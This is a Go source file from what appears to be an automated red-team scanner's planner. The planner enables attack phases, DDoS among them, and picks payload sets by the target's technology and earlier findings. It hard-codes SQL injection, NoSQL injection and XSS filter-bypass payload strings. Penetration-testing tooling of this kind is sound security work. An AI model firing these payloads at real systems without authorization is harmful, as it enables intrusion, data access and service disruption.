package agent

import (
	"fmt"
	"log"

	"red-team-agent/internal/config"
	"red-team-agent/internal/knowledge"
	"red-team-agent/internal/scanner"
)

type Planner struct {
	km *knowledge.Manager
}

func NewPlanner(km *knowledge.Manager) *Planner {
	return &Planner{km: km}
}

func (p *Planner) CreatePlan(target config.Target, kb *knowledge.KnowledgeBase) *scanner.ScanPlan {
	plan := &scanner.ScanPlan{
		Target:      target,
		Phases:      make(map[string]bool),
		PayloadSets: make(map[string][]string),
		SkipTests:   make(map[string]bool),
	}

	// Enable phases based on config
	plan.Phases["recon"] = target.Tests.Recon
	plan.Phases["discovery"] = target.Tests.Discovery
	plan.Phases["auth"] = target.Tests.Auth
	plan.Phases["authz"] = target.Tests.Authz
	plan.Phases["injection"] = target.Tests.Injection
	plan.Phases["logic"] = target.Tests.Logic
	plan.Phases["client_side"] = target.Tests.ClientSide
	plan.Phases["infra"] = target.Tests.Infra
	plan.Phases["ddos"] = target.Tests.DDoS
	plan.Phases["fuzz"] = target.Tests.Fuzz

	// Fresh target → full scan
	if kb.Skills.Iteration == 0 {
		log.Printf("[Planner] Fresh target %s — full scan", target.Name)
		return plan
	}

	log.Printf("[Planner] Target %s iteration %d — smart planning", target.Name, kb.Skills.Iteration+1)

	// Tech-aware payloads
	for _, tech := range kb.Profile.Technologies {
		switch tech.Name {
		case "postgresql", "postgres":
			plan.PayloadSets["sqli"] = append(plan.PayloadSets["sqli"], PostgreSQLPayloads()...)
		case "mysql":
			plan.PayloadSets["sqli"] = append(plan.PayloadSets["sqli"], MySQLPayloads()...)
		case "express", "node.js":
			plan.PayloadSets["nosql"] = append(plan.PayloadSets["nosql"], NoSQLPayloads()...)
		}
	}

	// Deepen known vulns
	for _, vuln := range kb.VulnHistory {
		switch vuln.Type {
		case "sqli-error":
			plan.PayloadSets["sqli"] = append(plan.PayloadSets["sqli"], BlindSQLiPayloads()...)
		case "sqli-blind":
			plan.PayloadSets["sqli"] = append(plan.PayloadSets["sqli"], TimeBasedSQLiPayloads()...)
		case "xss-reflected":
			plan.PayloadSets["xss"] = append(plan.PayloadSets["xss"], FilterBypassXSS()...)
		}
	}

	// Skip consistently failed techniques
	for i := range kb.Techniques {
		tech := &kb.Techniques[i]
		if tech.Failed() {
			plan.SkipTests[tech.Name] = true
		}
	}

	return plan
}

func PostgreSQLPayloads() []string {
	return []string{
		"' AND pg_sleep(5)--",
		"' UNION SELECT version()--",
		"'; SELECT * FROM pg_catalog.pg_tables--",
	}
}

func MySQLPayloads() []string {
	return []string{
		"' AND SLEEP(5)--",
		"' UNION SELECT @@version--",
		"' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
	}
}

func NoSQLPayloads() []string {
	return []string{
		`{"$gt":""}`,
		`{"$ne":""}`,
		`{"$regex":".*"}`,
		`{"$where":"sleep(5000)"}`,
	}
}

func BlindSQLiPayloads() []string {
	return []string{
		"' AND 1=1--",
		"' AND 1=2--",
		"' AND SUBSTRING(version(),1,1)='5'--",
	}
}

func TimeBasedSQLiPayloads() []string {
	return []string{
		"' AND SLEEP(5)--",
		"'; WAITFOR DELAY '0:0:5'--",
		"' AND pg_sleep(5)--",
	}
}

func FilterBypassXSS() []string {
	return []string{
		"<img src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"<ScRiPt>alert(1)</ScRiPt>",
		fmt.Sprintf("%cscript%calert(1)%c/script%c", '<', '>', '<', '>'),
		"{{constructor.constructor('alert(1)')()}}",
		"${alert('xss')}",
		"<details open ontoggle=alert(1)>",
		"<input/onfocus=alert(1) autofocus>",
	}
}
